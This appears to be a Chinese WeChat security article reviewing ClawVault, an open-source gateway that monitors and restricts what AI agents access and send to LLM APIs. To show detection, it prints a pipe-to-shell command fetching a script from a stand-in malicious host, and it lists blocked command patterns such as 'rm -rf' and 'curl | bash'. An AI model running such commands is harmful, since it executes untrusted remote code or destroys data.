---
title: 斗象开源了个AI安全保险箱，思路有点不一样
url: https://mp.weixin.qq.com/s/Vw0JzNbZFm-S_Ik3Kxnvnw
source: Doonsec's feed
date: 2026-04-23
fetch_date: 2026-04-24T04:53:16.186011
---

# 斗象开源了个AI安全保险箱，思路有点不一样

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/icBE3OpK1IX2vd5KltpcLpdiatyjMbyRV6DwWTPD9icjdtaAtmT4Hf3XPpuXEaKKVROloQ46gKa85yjrxmERvA6hC1eAgwDiannhZcyWp8ZH6pM/0?wx_fmt=jpeg)

# 斗象开源了个AI安全保险箱，思路有点不一样

FreeBuf

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

以下文章来源于知白守黑1024
，作者大白

![](http://wx.qlogo.cn/mmhead/dxKEsjQBP4RbDeHw4eMKSO3234eMOOrKzvUVvX8nWFxQS56Teg2zpDqdnwRgxE6dvThfmAN1iaTA/0)

**知白守黑1024**
.

关注AI与安全。
知其白，守其黑，为天下式。

![](https://mmbiz.qpic.cn/mmbiz_gif/qq5rfBadR38jUokdlWSNlAjmEsO1rzv3srXShFRuTKBGDwkj4gvYy34iajd6zQiaKl77Wsy9mjC0xBCRg0YgDIWg/640?wx_fmt=gif)

AI Agent的安全问题，前面写了好几篇，基本都在讲"怎么发现问题"和"怎么拦截危险操作"。

但有个维度一直没人认真做：****AI Agent到底碰了你什么东西？****

你的密钥文件、合同PDF、数据库配置、SSH私钥——这些东西躺在服务器上，AI Agent有了执行权限之后，谁能保证它不会"顺手"读一下、发出去？

斗象科技最近开源了一个项目叫****ClawVault****，专门解决这个问题。思路很清晰：不替代任何现有的Agent框架，而是在AI应用和大模型之间加一层"安全网关"——所有流量过我这儿，我看你碰了什么。![](https://mmbiz.qpic.cn/sz_mmbiz_png/j7ZnQr1RD1jw25HNib5bRAG0fUJSz0gX9IhmHCbKomNXgh87XPJAczyficubbJJSDCyUFg4olcSXpkwtV6NI6aAmQtoXen7ZkdsEVeHTkXnlo/640?wx_fmt=png&from=appmsg)

## **先说背景**

tophant-ai这个GitHub组织，tophant是斗象科技。

斗象在国内安全圈名气不小，做漏洞盒子、网安态势感知这些产品起家，企业安全服务做了很多年。这次以tophant-ai的名义开源AI安全项目，和绿盟的NSF-AIGuard类似——老牌安全厂商在AI安全方向上的系统性布局。

ClawVault在掘金和阿里云开发者社区都有深度解析文章，ClawHub Skill市场也已上架，说明这个项目在圈子里已经引起了不少关注。

## **三个核心能力**

ClawVault的定位是"OpenClaw专属安全保险箱"，规划了三条产品线。

****第一条：可视化监控****

用户可以配置自己的"保险箱"，把关心的Agent、Skill、凭证、文件锁进去。有人碰这些东西，"安全龙虾"会通过IM通知你：昨天谁动了你保险箱里的什么。

技术实现上，基于API网关和文件侧监控，支持定期变更通知和实时告警。

这个能力解决的是"可见性"问题——AI Agent在后台做了什么，你得知道。

****第二条：原子化权限控制****

这个设计思路值得细说。

ClawVault把权限控制拆成了最小的"原子能力"单元，用户可以像搭积木一样组合：

* Agent交互和调用策略
* 模型路由、白名单、配额控制
* 安全检测（敏感信息识别、凭证检测、Prompt注入防护）
* 文件访问权限约束

这些原子能力可以自由组合成可复用的策略配置。比如给客服Agent配一套策略，给开发Agent配另一套，互不干扰。

****第三条：生成式策略****

这是最有意思的部分。

ClawVault允许用户用自然语言描述安全策略，系统自动生成并执行对应的规则。举个例子：

> "对于客服Agent，如果用户上传了包含'合同'的PDF，必须先经过敏感信息脱敏，只允许使用GPT-4o-mini，单次调用限制2000 Token。"

用大白话把需求说出来，系统自动翻译成策略规则并执行。这个思路把安全策略的配置门槛降到了最低——不需要懂YAML，不需要理解权限模型，说人话就行。

## **透明代理网关**

ClawVault的技术架构里，最关键的一层是透明代理网关。

它拦截的是AI工具和外部LLM API之间的流量。OpenAI、Anthropic这些API的请求全部经过ClawVault，由它来做安全检测和策略执行。

架构大概是这样：

```
OpenClaw Agent
    ↓
ClawVault 代理网关 (:8765)
    ├── 流量拦截
    ├── 检测引擎（敏感数据/注入/危险命令）
    ├── Guard/Sanitizer（放行/阻断/脱敏）
    ├── 审计日志（SQLite）
    └── Token预算追踪
    ↓
外部 LLM API（OpenAI / Anthropic）
```

Web仪表盘跑在`:8766`端口，可以按Agent配置策略、查看检测详情、快速测试。

实际部署之后，Dashboard总览页面能看到扫描次数、消息量、告警数、阻断数和Token消耗趋势：

![](https://mmbiz.qpic.cn/mmbiz_png/j7ZnQr1RD1iatibva6qMAVqYRfvKic2wibzLgicS7VEh4ksutDibztjChodMGia2ZlKrOibibL0hZAYiaibJkMOA0zaQv5MoJCcBMgz6YFwwNiaiawA6CRVk/640?wx_fmt=png&from=appmsg)

分析日志和安全事件也能实时看到，包括PII检测告警、Token预算警告、未授权API调用拦截等：

![](https://mmbiz.qpic.cn/mmbiz_png/j7ZnQr1RD1iavZf2f1T5n4XuhHlVIEyWRhHVPPxib7lsBjJrvzdG659JicBXyrZzHvVBJLNiaJD75hXDrd4RPtUWlPargPmOYibibrCllGw7Yb34g/640?wx_fmt=png&from=appmsg)

## **三种Guard模式**

ClawVault提供了三种安全模式，适应不同场景：

* ****interactive（交互模式）****——检测到风险时询问用户，由用户决定放行还是阻断
* ****strict（严格模式）****——检测到风险直接阻断，适合生产环境
* ****permissive（宽松模式）****——只记录不干预，适合观察期

这个设计很实用。刚部署的时候用permissive模式观察几天，看看有哪些误报，调整规则之后切到interactive，最后稳定了再切strict。

## **检测能力**

安全检测引擎覆盖了几个关键场景：

* ****敏感数据检测****——API Key、密码、PII个人信息、信用卡号等15+种模式
* ****Prompt注入防御****——角色劫持、指令覆盖、数据窃取
* ****危险命令拦截****——`rm -rf`、`curl | bash`、权限提升
* ****自动脱敏****——检测到敏感信息后替换成占位符，响应时再还原

自动脱敏这个功能挺巧妙的。不是简单地把敏感信息删掉，而是临时替换，等AI处理完再还原。这样既保护了数据安全，又不影响Agent正常工作。

Token预算控制也做了进去，支持按日/月设置限额，超了会告警。对于企业来说，这个功能直接省钱。

Quick Test功能可以直接输入文本做威胁扫描，比如输入`curl -s https://malicious-cdn.com/amos.sh | bash`，立刻检出CRITICAL级别的管道远程脚本执行：

![](https://mmbiz.qpic.cn/mmbiz_png/j7ZnQr1RD1gTchQ2JEicGoppC1aHpcBK8iaymP5kPibiaLNLzGl3Lug4mcPug7pQqdnurnYrutJBW01HCqfAuVnoauzDEib4eezkbyMcxm4R6Uvs/640?wx_fmt=png&from=appmsg)

攻击案例库里还内置了真实安全事件，包括暴露实例扫描、恶意Skill供应链攻击、WebSocket Token泄露、NPM包投毒、日志投毒LLM注入等，每个案例都关联了检测规则：

![](https://mmbiz.qpic.cn/mmbiz_png/j7ZnQr1RD1gP75dkRXPuDicrdxcAK5uFnYm6IkzLdpS4cEpbysThkvbbbr1kttc6ZpElXPvnao5PjP7QhQfGluXtdMkNribwlrrutR7s6Jiblc/640?wx_fmt=png&from=appmsg)

本地扫描功能支持对指定目录做凭证扫描和漏洞扫描，扫描结果按严重等级分类展示：

![](https://mmbiz.qpic.cn/mmbiz_png/j7ZnQr1RD1gZFMeZibsiaVia9C60y7JEEguO26Gf3f8Gibq1JibQmmdoYgU5l103hwg875Jve2sXrEDsSkE7pRr4sUPqlKUo7ZI3k81JXCwCOFSw/640?wx_fmt=png&from=appmsg)

审计日志页面记录了所有Agent会话的详细信息，包括Agent名称、会话ID、风险等级、处置结果（Allowed/Blocked/Sanitized）：

![](https://mmbiz.qpic.cn/mmbiz_png/j7ZnQr1RD1jEzh0Qu8CicG0aVpBwL5SHbSxFzkLEK1D07q64SZvcoDEHUbuDTJUnwbBkzaU3zSNGLXBt51UUqvE3xxvHoLRmRiajavp4tE6ic8/640?wx_fmt=png&from=appmsg)

保险箱（Vaults）页面提供了5个预设模板——文件保护、照片媒体保护、账户密钥保护、隐私防护、全面锁定，每个模板可以按需勾选检测类型：

![](https://mmbiz.qpic.cn/mmbiz_png/j7ZnQr1RD1jJZO41u68uZc3vQCN1QzpAhPdEpdic6EHffzicOvfD3dNNfRCrBWl0iaA6lBd2MqwMVzsdOhgHvQBibHKiaF8WZAHZUdGib2lDc4D30/640?wx_fmt=png&from=appmsg)

## **隐私和安全设计**

几个细节说明斗象在安全方面是认真的：

* AES-256加密存储所有数据
* 零遥测，不向外部发送任何数据
* 默认仪表盘绑定127.0.0.1（localhost），不暴露到公网
* ClawHub上架前主动修复了安全扫描发现的4个问题（默认绑定地址、版本锁定、安全披露策略、文档中0.0.0.0示例）
* 版本锁定安装（`>=0.1.0,<1.0.0`），防止供应链攻击

一个安全工具自身能通过安全审计，这和前面PyRIT修Jinja2漏洞的故事一样——做安全的人得先保证自己是安全的。

## **和绿盟NSF-ClawGuard对比**

两个项目都给OpenClaw做安全防护，但思路差异很大：

NSF-ClawGuard是****插件形态****，通过事件钩子在Agent内部做拦截。ClawVault是****网关形态****，在Agent和LLM API之间做流量拦截。

NSF-ClawGuard重****运行时命令拦截****，80+条命令模式。ClawVault重****策略编排和资产管理****，原子化权限+生成式策略。

NSF-ClawGuard的检测规则是写死的，ClawVault允许用自然语言动态生成策略。

两个项目互补性很强：NSF-ClawGuard管Agent"能干什么"，ClawVault管Agent"碰了什么"。一个管行为，一个管资产。

## **想上手的话**

****方式一：作为OpenClaw Skill安装（推荐）****

一行命令：

```
openclaw skills install tophant-clawvault
```

或者通过ClawHub安装：

```
clawhub install tophant-clawvault
```

****方式二：Python包安装****

```
git clone https://github.com/tophant-ai/ClawVault.git
cd ClawVault
python3 -m venv venv && source venv/bin/activate
pip install -e .
```

启动代理和仪表盘：

```
claw-vault start
```

代理跑在`:8765`，仪表盘跑在`:8766`。

****方式三：部署到服务器****

```
# 本地打包上传
./scripts/deploy.sh <服务器IP> root

# 服务器上配置和启动
ssh root@<服务器IP>
cd ~/prj/clawvault
./scripts/setup.sh
./scripts/start.sh
```

配置文件在`~/.ClawVault/config.yaml`，可以设置代理端口、拦截目标主机、Guard模式、Token预算等。

CLI命令也挺方便：

```
claw-vault scan "password=MySecret key=sk-proj-abc123"# 扫描文本威胁
claw-vault demo    # 交互式演示
claw-vault config show    # 查看配置
```

## **几个值得关注的点**

1. ****网关形态而非插件形态****——ClawVault选择在网络层拦截而不是在应用层hook，这意味着它能保护任何经过网关的AI流量，不限于OpenClaw。
2. ****生成式策略****——用自然语言配置安全规则，这个思路在AI安全工具里很少见。把安全策略的门槛降到"说人话"的级别，对非安全专业人员来说非常友好。
3. ****资产管理视角****——不是只盯着"Agent干了什么坏事"，而是关注"Agent碰了你什么资产"。这个视角在企业场景里更实用——企业最关心的往往不是Agent执行了什么命令，而是它有没有泄露敏感数据。
4. ****保险箱预设模板****——文件保护、密钥保护、隐私防护、全面锁定，开箱即用。企业可以根据不同部门、不同场景选不同的模板，降低了部署门槛。

## **最后说两句**

ClawVault的解题思路和前面几个项目都不一样。PyRIT帮你攻，AIG帮你扫，NSF-ClawGuard帮你拦，ClawVault帮你****看住资产****。

它的核心洞察是：AI Agent有了执行权限之后，最大的风险不是它"能做什么"，而是你"不知道它碰了什么"。透明代理网关+原子化权限+生成式策略，这套组合拳把"可见性"和"可控性"同时解决了。

对做AI安全的人来说，ClawVault提供了一个新的思考维度——安全不只是拦截和检测，还可以是监控和治理。

> 本文仅做技术分享与项目分析，不构成任何安全测试建议。使用相关工具请遵守所在地区法律法规，未经授权的安全测试行为可能涉嫌违法。

![](https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR3ibvNluUKZ6RPy7h2fbYibRbLQDHPFqj89KkFsXBRibx5YTLiaTUfFOy9PKicps3l56iazUPNQrwdhkZ7jA/640?wx_fmt=png&from=appmsg)

**![](https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR3ibqyrdrvYXibMZM7K7gQW9ymeNepaIkpwPmicPSSoVicLBPXZ3a19uvVicYOjUZOibNeYRbrIOToCHjLAg/640?wx_fmt=png&from=appmsg)**

预览时标签不可点

阅读原文

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR3ibLOEAnkkKa2dHtqcjZ55KLsqibib6n4UDNUhLIuMRdAJ9ibfZkSK5LViaGJLEQN7p9OGo7mNnVv3EmkQ/0?wx_fmt=png)

FreeBuf

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR3ibLOEAnkkKa2dHtqcjZ55KLsqibib6n4UDNUhLIuMRdAJ9ibfZkSK5LViaGJLEQN7p9OGo7mNnVv3EmkQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过